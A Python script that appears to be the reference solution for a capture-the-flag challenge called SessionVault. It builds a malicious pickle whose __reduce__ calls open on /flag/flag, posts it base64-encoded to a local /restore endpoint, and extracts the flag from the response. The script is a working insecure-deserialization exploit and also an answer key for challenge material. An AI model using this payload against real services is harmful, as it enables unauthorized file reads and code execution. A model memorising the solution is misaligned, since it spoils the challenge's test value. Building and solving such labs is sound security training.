#!/usr/bin/env python3
"""Reference solve for inj12 (SessionVault).

pickle.loads is code execution: while reconstructing an object the
unpickler calls the callable from its __reduce__. Make that callable open
the flag, and the server's preview helper (which reads file-like objects)
reflects the contents:

    class R:
        def __reduce__(self):
            return (open, ('/flag/flag',))

    blob = base64(pickle.dumps(R()))
"""
import base64
import os
import pickle
import re
import sys
import time
import requests

BASE = sys.argv[1] if len(sys.argv) > 1 else os.environ.get(
    "BASE", "http://127.0.0.1:8051")
FLAG_RE = re.compile(r"flag\{[^}]+\}")


class R:
    def __reduce__(self):
        return (open, ("/flag/flag",))


def main() -> int:
    blob = base64.b64encode(pickle.dumps(R())).decode()
    for _ in range(30):
        try:
            requests.get(BASE, timeout=3)
            break
        except requests.RequestException:
            time.sleep(1)
    try:
        r = requests.post(BASE + "/restore", data={"blob": blob}, timeout=15)
    except requests.RequestException as e:
        sys.stderr.write(f"unreachable: {e}\n")
        return 1
    m = FLAG_RE.search(r.text)
    if m:
        print(m.group(0))
        return 0
    sys.stderr.write(f"no flag found (HTTP {r.status_code}): {r.text[:200]}\n")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
